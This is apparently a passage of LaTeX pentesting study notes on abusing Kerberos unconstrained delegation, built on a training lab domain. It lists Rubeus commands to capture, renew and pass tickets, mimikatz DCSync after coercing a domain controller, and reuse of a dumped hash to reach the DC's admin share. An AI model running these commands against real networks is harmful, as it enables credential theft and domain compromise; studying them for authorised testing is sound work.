\section{Unconstrained Delegation}

Recall:
\begin{itemize}
    \item the TGT of the accound authenticating to the account (computer or user) is stored in the TGS.
    \item the TGS is stored in lsass.
\end{itemize}

\subsection{Computer}

\subsubsection{Regular exploit}
waiting for user to authenticate:
\begin{verbatim}
.\Rubeus.exe monitor /interval:5 /nowrap

\end{verbatim}

Using the Ticket to Request another Ticket:
\begin{verbatim}
Rubeus.exe asktgs /ticket:doIFmTC<SNIP>LkxPQ0FM /service:cifs/dc01.INLANEFREIGHT.local /ptt
Rubeus.exe renew /ticket:doIFmTCCBZWgAwIBBaE<SNIP>LkxPQ0FM /ptt
\end{verbatim}

\subsubsection{Coercing a DC}

Leveraging coercing attack on a DC allow DCSync. Once the DC connect to the compormised computer renew the TGT so that it is loaded then using \verb+mimikatz+ perform dcsync to obtain any hash
\begin{verbatim}
Rubeus.exe renew /ticket:doIFmTCCBZWgAwIBBaE<SNIP>LkxPQ0FM /ptt
mimikatz.exe "lsadump::dcsync /user:sarah.lafferty"
Rubeus.exe asktgt /rc4:0fcb586d2aec31967c8a310d1ac2bf50 /user:sarah.lafferty /ptt
dir \\dc01.inlanefreight.local\c$
\end{verbatim}

\subsection{User}





\begin{itemize}
    \item 
        \url{https://www.hackingarticles.in/domain-escalation-unconstrained-delegation/}
    \item 
        \url{https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html#unconstrained-delegation}
    \item 
        \url{https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/unconstrained-delegation}
\end{itemize}

